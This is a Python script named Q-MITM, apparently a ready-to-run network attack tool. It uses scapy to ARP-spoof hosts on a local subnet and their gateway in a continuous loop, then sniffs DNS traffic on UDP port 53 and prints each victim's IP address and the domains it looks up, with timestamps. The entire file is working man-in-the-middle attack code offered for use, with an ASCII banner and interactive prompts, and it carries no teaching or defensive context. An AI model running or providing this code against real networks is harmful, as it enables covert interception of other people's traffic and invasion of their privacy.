import logging
from scapy.all import ARP, send, sniff
from scapy.layers.dns import DNS, DNSQR, DNSRR, IP
import threading
import time
from datetime import datetime
from colorama import Fore, Back, Style, init
import os
import pyfiglet

init(autoreset=True)
os.system("clear")
ascii_art = pyfiglet.figlet_format("Q-MITM")
print(Fore.GREEN + Style.BRIGHT + ascii_art)
print(Fore.YELLOW + "Q-MITM: Man-in-the-Middle DNS Monitoring Tool")
print(Fore.BLUE + "-" * 70)

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def arp_spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', psrc=spoof_ip)
    send(packet, verbose=False)

def dns_packet(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:  
        ip_src = packet[IP].src  
        dns_query = packet[DNSQR].qname.decode() 
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        if dns_query.endswith(".in-addr.arpa."):
            if packet.haslayer(DNSRR):  
                for rr in packet[DNSRR]:
                    if rr.type == 12: 
                        print(f"{Fore.GREEN}{timestamp} | {Fore.YELLOW}{ip_src:<15} | {Fore.CYAN}{rr.rdata.decode()}")
        else:
            print(f"{Fore.GREEN}{timestamp} | {Fore.YELLOW}{ip_src:<15} | {Fore.CYAN}{dns_query}")

def start_arp(target_ip, gateway_ip):
    while True:
        arp_spoof(target_ip, gateway_ip)
        arp_spoof(gateway_ip, target_ip)
        time.sleep(2)  

def get_valid_input(prompt, default_value):
    while True:
        value = input(prompt)
        if value:
            return value
        else:
            print(f"{Fore.RED}Please provide a valid input, using default: {default_value}")
            return default_value

network_ip = get_valid_input("Local network to be monitored (192.168.1.0/24) : ", "192.168.1.0/24")
gateway_ip = get_valid_input("Gate address (Gateway) : ", "192.168.1.1")
lan = get_valid_input("Specify your interface (eg eth0 or wlan0) : ", "wlan0")

threading.Thread(target=start_arp, args=(network_ip, gateway_ip), daemon=True).start()

print(Fore.GREEN + "[+] Network traffic : 2025")
print(Fore.BLUE + "-" * 70)
print(f"{'Time':<20} {'IP Address':<20} {'DNS Query'}")
print(Fore.BLUE + "-" * 70)

try:
    sniff(filter="udp port 53", prn=dns_packet, store=0, iface=lan)
except Exception as e:
    print(f"{Fore.RED}Error occurred while sniffing: {e}")
